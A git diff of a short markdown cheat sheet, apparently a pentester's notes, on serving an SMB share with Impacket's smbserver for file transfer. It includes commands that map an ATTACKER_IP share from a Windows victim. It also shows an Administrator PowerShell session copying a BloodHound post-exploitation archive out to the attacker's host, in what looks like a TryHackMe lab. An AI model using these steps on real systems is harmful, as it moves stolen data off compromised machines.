@@ -2,6 +2,15 @@ https://vk9-sec.com/smb-server-with-impaket-smbserver/
 
 https://notes.offsec-journey.com/active-directory/windows-priv-esc/file-transfer
 
+### [Simple but obsolete SMB1 protocol and unsafe](#simple-but-obsolete-smb1-protocol-and-unsafe-1)
+
+### [smb2support](#smb2support-1)
+
+### [With Username & Password](#with-username--password-1)
+
+
+### Simple but obsolete SMB1 protocol and unsafe
+```
 $ impacket-smbserver sharethis .
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -13,9 +22,11 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed
 
 ... waiting for incoming ...
+```
 
+### With Username & Password
+```
 $ impacket-smbserver sharethis . -username listening -password connections
-
 
 net use \\ATTACKER_IP\share /USER:user s3cureP@ssword 
 
@@ -42,3 +53,20 @@ copy out.txt \\10.10.16.52\sharethis
         1 file(s) copied.                                                                                                            
                                                                                                                                      
 c:\inetpub\wwwroot\z> 
+```
+
+### smb2support
+$ $ smbserver a . -smb2support -username abc -password 123
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+...
+
+PS C:\Users\Administrator> net use \\10.1.1.1\a
+Enter the user name for '10.1.1.1': abc
+Enter the password for 10.1.1.1: 123
+The command completed successfully.
+
+PS C:\Users\Administrator>
+PS C:\Users\Administrator> copy .\THM-PostExploit_20230909004059_BloodHound.zip \\10.1.1.1\a
+PS C:\Users\Administrator> 
